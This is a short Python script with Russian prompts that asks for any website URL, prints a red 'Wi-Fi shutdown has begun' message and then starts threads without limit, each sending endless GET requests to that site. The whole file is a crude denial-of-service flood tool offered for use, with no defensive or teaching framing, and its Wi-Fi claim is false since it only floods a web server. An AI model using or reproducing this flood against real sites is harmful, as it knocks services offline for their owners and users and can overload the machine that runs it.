# coding: utf8
import threading
import requests
import colorama


print("Введите ссылку на любой сайт:")
url = input()

print(colorama.Fore.RED + "ОТКЛЮЧЕНИЕ WIFI НАЧАЛОСЬ!")

def dos():
 while True:
  requests.get(url)
  
while True:
 threading.Thread(target=dos).start()